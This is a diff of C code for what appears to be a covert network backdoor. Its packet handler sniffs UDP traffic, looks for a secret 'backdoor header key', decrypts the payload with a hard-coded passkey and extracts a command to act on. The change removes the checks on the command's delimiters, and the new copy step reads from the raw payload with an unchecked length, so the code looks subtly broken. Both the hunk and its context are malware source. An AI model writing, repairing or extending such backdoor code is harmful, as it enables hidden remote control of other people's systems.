@@ -68,22 +68,20 @@ void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
 {
 	int len;
-	char *ptr, *ptr2;
+	char *ptr;
 	char *decryptMsg;
 	char *command;
 	int duplex = (int) user;
 	u_int32_t ip;
 	short port;
-	int hdr_len, start_len, end_len;
+	int hdr_len;
 
 	hdr_len = strlen(HDR_KEY);
-	start_len = strlen(CMD_STR);
-	end_len = strlen(CMD_END);
 
 	/* Step 1: locate the payload portion of the packet */
 	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
 
-	if (pkt_info->caplen - ETHER_IP_UDP_LEN - hdr_len - start_len - end_len <= 0)
+	if (pkt_info->caplen - ETHER_IP_UDP_LEN - hdr_len <= 0)
 		return;
 
 	/* Step 2: check payload for backdoor header key */
@@ -100,18 +98,9 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 
 	decryptMsg = decrypt(PASSKEY, decryptMsg, len);
 
-	//Step 4: verify decrypted contents
-	if (!(ptr = strstr(decryptMsg, CMD_STR)))
-		return;
-
-	ptr += start_len;
-
-	if (!(ptr2 = strstr(ptr, CMD_END)))
-		return;
-
 	// Step 5: extract the remainder
 	command = (char*) calloc(1, MAX_LEN);
-	strncpy(command, ptr, (ptr2 - (ptr - 1)));
+	strncpy(command, ptr, len);
 
 	free(decryptMsg);
 
